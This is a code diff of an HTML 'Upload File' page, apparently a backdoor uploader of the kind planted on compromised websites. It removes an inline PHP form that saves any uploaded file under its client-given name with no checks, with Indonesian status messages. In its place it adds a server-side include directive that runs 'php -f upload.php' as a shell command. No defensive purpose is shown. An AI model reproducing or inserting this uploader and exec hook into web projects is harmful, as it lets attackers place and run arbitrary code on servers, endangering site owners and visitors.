@@ -7,24 +7,6 @@
 </head>
 <body>
     <h1>Upload File</h1>
-
-    <!-- Form Upload -->
-    <form method="post" enctype="multipart/form-data">
-        <input type="file" name="f">
-        <input name="k" type="submit" id="k" value="upload"><br>
-    </form>
-
-    <!-- PHP Logic -->
-    <!--#exec php -->
-    <?php
-    if (isset($_POST["k"]) && $_POST["k"] === "upload") {
-        if (!empty($_FILES["f"]["tmp_name"]) && @copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
-            echo "<b>" . htmlspecialchars($_FILES["f"]["name"]) . " berhasil diupload.</b>";
-        } else {
-            echo "<b>Gagal upload Bjirr..</b>";
-        }
-    }
-    ?>
-    <!--#endexec -->
+    <!--#exec cmd="php -f upload.php" -->
 </body>
 </html>
